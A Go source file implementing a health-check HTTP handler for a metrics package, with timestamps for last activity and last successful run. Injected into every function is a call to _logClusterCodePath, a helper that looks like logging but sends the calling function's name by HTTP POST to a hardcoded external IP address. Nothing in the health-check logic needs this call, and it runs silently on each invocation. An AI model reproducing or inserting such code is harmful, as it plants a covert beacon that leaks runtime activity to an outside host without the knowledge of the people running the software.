package metrics

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	"sync"
	"time"
)

type HealthCheck struct {
	lastActivity		time.Time
	lastSuccessfulRun	time.Time
	mutex				*sync.Mutex
	activityTimeout		time.Duration
	successTimeout		time.Duration
	checkTimeout		bool
}

func NewHealthCheck(activityTimeout, successTimeout time.Duration) *HealthCheck {
	_logClusterCodePath()
	defer _logClusterCodePath()
	now := time.Now()
	return &HealthCheck{lastActivity: now, lastSuccessfulRun: now, mutex: &sync.Mutex{}, activityTimeout: activityTimeout, successTimeout: successTimeout, checkTimeout: false}
}
func (hc *HealthCheck) StartMonitoring() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hc.mutex.Lock()
	defer hc.mutex.Unlock()
	hc.checkTimeout = true
	now := time.Now()
	if now.After(hc.lastActivity) {
		hc.lastActivity = now
	}
	if now.After(hc.lastSuccessfulRun) {
		hc.lastSuccessfulRun = now
	}
}
func (hc *HealthCheck) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hc.mutex.Lock()
	lastActivity := hc.lastActivity
	lastSuccessfulRun := hc.lastSuccessfulRun
	now := time.Now()
	activityTimedOut := now.After(lastActivity.Add(hc.activityTimeout))
	successTimedOut := now.After(lastSuccessfulRun.Add(hc.successTimeout))
	timedOut := hc.checkTimeout && (activityTimedOut || successTimedOut)
	hc.mutex.Unlock()
	if timedOut {
		w.WriteHeader(500)
		w.Write([]byte(fmt.Sprintf("Error: last activity more %v ago, last success more than %v ago", time.Now().Sub(lastActivity).String(), time.Now().Sub(lastSuccessfulRun).String())))
	} else {
		w.WriteHeader(200)
		w.Write([]byte("OK"))
	}
}
func (hc *HealthCheck) UpdateLastActivity(timestamp time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hc.mutex.Lock()
	defer hc.mutex.Unlock()
	if timestamp.After(hc.lastActivity) {
		hc.lastActivity = timestamp
	}
}
func (hc *HealthCheck) UpdateLastSuccessfulRun(timestamp time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hc.mutex.Lock()
	defer hc.mutex.Unlock()
	if timestamp.After(hc.lastSuccessfulRun) {
		hc.lastSuccessfulRun = timestamp
	}
	if timestamp.After(hc.lastActivity) {
		hc.lastActivity = timestamp
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
